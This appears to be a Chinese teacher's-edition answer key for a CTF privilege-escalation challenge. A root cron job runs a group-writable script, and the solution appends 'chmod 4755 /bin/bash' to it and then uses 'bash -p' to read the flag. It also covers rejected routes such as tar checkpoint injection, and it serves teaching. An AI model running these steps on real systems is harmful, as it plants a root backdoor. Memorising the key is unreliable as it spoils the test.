# 第 3 题（教师版）：root 的计划任务在用“大家的”脚本

> **唯一提权面**：`/opt/archive/run.sh` 属主 `root:web`、权限 `775`，而 `player` 在 `web` 组里；
> 该脚本由 `/etc/cron.d/archive` 每分钟以 **root** 执行。
> **唯一解**：向脚本追加 `chmod 4755 /bin/bash`，等 cron 执行后 `bash -p` 提权。
> **已刻意堵死**：脚本里所有命令都对路径加了引号（无通配符注入面）、cron 配置不可写、`/opt/archive` 目录不可写、
> `/srv/uploads` 虽可写但只影响 tar 打包内容，不构成提权。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/opt/archive/run.sh` | `root:web 0775` | **唯一提权面**，cron 以 root 执行（组可写） |
| `/etc/cron.d/archive` | `root:root 0644` | `* * * * * root /opt/archive/run.sh` |
| `/opt/archive` | `root:root 0755` | 目录不可写（不能替换脚本） |
| `/srv/uploads` | `root:root 1777` | 场景素材，能写但不构成提权 |
| `/backup` | `root:root 0755` | 输出目录 |

`player`：uid 1001，附加组 `web`。
容器入口通过 `/usr/local/sbin/project-init.sh` 后台拉起 `cron`（容器内无 systemd）。

## 二、唯一解

```bash
id
# uid=1001(player) gid=1001(player) groups=1001(player),999(web)

ls -la /opt/archive/
# -rwxrwxr-x 1 root web  run.sh      <-- 组可写，而我在 web 组

echo 'chmod 4755 /bin/bash' >> /opt/archive/run.sh
# 等最多 60 秒，确认被执行：
tail -2 /var/log/archive.log

/bin/bash -p
id          # uid=0
cat /flag.txt
```

### 关键点讲解

- **判断顺序**：谁执行（cron 里写的用户）→ 执行的是哪个文件 → 文件谁能改。
- `775` + 属组 `web` 是典型“为了协作给了组写权限”，但这份脚本是 **root 执行的**。
  （注意：脚本必须有执行位，否则 cron 根本跑不起来——这是真实运维里也常见的坑。）
- 不用改所有权、不用重启任何服务，1 分钟内自动生效。
- 教学延伸：真实场景里这种脚本常被 `logrotate`、监控 agent、备份脚本以 root 调用。

## 三、为什么只有这一条解

| 可能的其他思路 | 为什么失败 |
|---|---|
| 改 `/etc/cron.d/archive` | 目录与文件均 `root:root 0644`，不可写 |
| 替换 `/opt/archive/run.sh`（删了重建） | `/opt/archive` 目录 755 root，不能删除/替换文件 |
| 上传目录通配符注入（`--checkpoint-action`） | `run.sh` 中 `tar ... /srv/uploads` 已加引号且不带 `*`，参数不被展开 |
| 改 `/srv/uploads` 内容 | 只改变备份包内容，无代码执行 |
| 等 cron 期间被发现的 SUID | 无预置 SUID 异常项 |

## 四、单解验证

```bash
# 正向
id | grep web
ls -l /opt/archive/run.sh      # -rwxrwxr-x root web
echo 'chmod 4755 /bin/bash' >> /opt/archive/run.sh
sleep 65
ls -l /bin/bash                # -rwsr-xr-x
/bin/bash -p -c 'id; cat /flag.txt'

# 负向（必须全部失败）
echo x >> /etc/cron.d/archive        # Permission denied
mv /opt/archive/run.sh /tmp/x        # Permission denied (目录不可写)
touch '/srv/uploads/--checkpoint=1'  # 能建文件，但 tar 不展开参数，不产生执行
```
